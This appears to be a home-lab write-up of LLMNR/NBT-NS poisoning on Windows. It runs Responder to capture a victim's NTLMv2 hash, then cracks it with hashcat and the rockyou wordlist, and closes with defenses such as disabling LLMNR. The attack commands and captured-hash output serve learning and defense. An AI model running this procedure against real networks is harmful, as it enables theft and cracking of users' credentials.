## Introduction

LLMNR stands for **Link-Local Multicast Name Resolution.**

Windows uses this when it cannot find a computer name through DNS. When DNS fails, Windows shouts to the whole network:

> *"Hey, does anyone know where \\fileserver is?"*

The problem is — any machine on the network can reply. So an attacker can say *"Yeah, that's me!"* and the victim sends their password hash without knowing.

## Protocol Order (Windows Name Resolution)

- **DNS** → tries first  
- **mDNS** → tries second  
- **LLMNR** → tries third (can be abused)  
- **NBT-NS** → tries last (can also be abused)  

## How the Attack Works

```
Victim                    Network                         Attacker
  |                          |                               |
  |--- DNS request --------->|                               |
  |<-- DNS: "I don't know" --|                               |
  |                          |                               |
  |--- LLMNR broadcast ----->|                               |
  |    "Who knows            |<-- Responder listening -------|
  |     fileserver?"         |                               |
  |                          |                               |
  |<-- "I know! I am him!" --|-------------------------------|
  |                          |                               |
  |--- NTLMv2 Hash --------->|------------------------------>|
  |    (credentials sent)    |                               |
  |                          |                 Attacker captures
  |                          |                 NTLMv2 hash
```

## Lab Setup
```
|   Component  |        Details                   |
|--------------|----------------------------------|
| Attacker     |       Kali Linux                 | 
| Victim       |       Windows 10                 | 
| Tool 1       |       Responder                  |
| Tool 2       |       Hashcat                    |
| Attacker IP  |       192.168.5.128              |
| Victim IP    |       192.168.5.136              |
```
Both machines on same VirtualBox Host-Only network.

## Attack Steps

## Step 1 — Check My IP Address

Before starting Responder, I first identified my network interface name and IP address.

```bash
ip a
```
<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step1.png" width="600">
</p>

## Output:
```
eth0: 192.168.5.128
```

## Step 2 — Start Responder

After identifying my network interface, I launched Responder to listen for LLMNR, NBT-NS, and WPAD requests on the network.

```bash
sudo responder -I eth0 -dwv
```
```
|    Flag   |     Meaning       |
|-----------|-------------------|
| -I eth0   | Network interface |
|    -d     | DHCP poisoning    |
|    -w     | WPAD proxy server |
|    -v     | Verbose mode      |
```
Responder will now listen on the network and wait for someone to broadcast a name request.

</p>

## Step 3 — Trigger from Victim Machine

On the victim machine, I opened File Explorer and typed:
```
\\fakeshare
```
Since fakeshare does not exist, Windows could not find it through DNS and sent an LLMNR request on the network.

In my lab, the victim machine name was VICTIM-2.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step3-1.png" width="600">
</p>

Windows first tried DNS, but it could not find the hostname. It then sent an LLMNR request on the network, which was captured by Responder.

### Captured Credentials

On my Kali machine, Responder captured the victim's NTLMv2 authentication attempt and displayed the following information:

```
[SMB] NTLMv2-SSP Client   : fe80::1ba4:8be8:5787:2d63
[SMB] NTLMv2-SSP Username : VICTIM-2\karim
[SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:010100000000000000CFC35AC5E6DC0135AE1EB1E9966109000000000200080036005A .... (full hash)...
```

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step3-2.png" width="600">
</p>

## Step 4 — Save the Captured Hash

- step 4.1: Copy the Hash
First, I copied the NTLMv2 hash captured by Responder.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-1.png" width="600">
</p>

- step 4.2: Create a File for the Hash
On my Kali machine, I created a new file using Nano:

```bash
nano hash.txt
```
- step 4.3: Open the File
After running the command, I pressed Enter to open the file.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-2.png" width="600">
</p>

- step 4.4: Paste the Hash.
Once Nano opened, I pasted the captured NTLMv2 hash into the file.

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step4-3.png" width="600">
</p>

- step 4.5: Save the File
To save the file, I pressed:

```bash
Ctrl + X
Y
Enter
```
This saved the hash to hash.txt, which I used in the next step for password cracking.

## Step 5 — Crack the Captured Hash

After saving the NTLMv2 hash, I used Hashcat with the RockYou wordlist to try and recover the password.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```
|             Flag                 |                   Meaning                     |
| -------------------------------- | --------------------------------------------- |
| hashcat                          | Password cracking tool                        |
| -m 5600                          | Hash type (NTLMv2 hash mode)                  |
| hash.txt                         | File containing captured hashes               |
| /usr/share/wordlists/rockyou.txt | Wordlist used for dictionary attack (rockyou) |
```

## Result:

After a short time, Hashcat successfully cracked the password and displayed the result:
```
KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:10101000000000011

```
### Cracked Password

```text
Password1
```

<p align="center">
  <img src="/Active-Directory/01-llmnr-poisoning/images/step5.png" width="600">
</p>

This confirmed that the captured NTLMv2 hash could be cracked using a common wordlist because the password was weak.

## Defense & Mitigation

**Fix 1 — Disable LLMNR via Group Policy:**

Computer Configuration
→ Administrative Templates
→ Network
→ DNS Client
→ Turn off Multicast Name Resolution
→ Set to: ENABLED

**Fix 2 — Disable NBT-NS:**

Control Panel
→ Network and Sharing Center
→ Change Adapter Settings
→ Right click → Properties
→ IPv4 → Advanced
→ WINS tab
→ Select "Disable NetBIOS over TCP/IP"

**Fix 3 — Enable Network Access Control (NAC):**

Prevent unknown devices from joining the network.

**Fix 4 — Use Strong Passwords:**

Long complex passwords make hash cracking extremely difficult or impossible.

## Key Takeaways

- Works on most corporate networks — LLMNR is on by default
- No special access needed — just be on the same network
- Full attack takes less than 5 minutes
- Turning off LLMNR and NBT-NS fully stops this attack
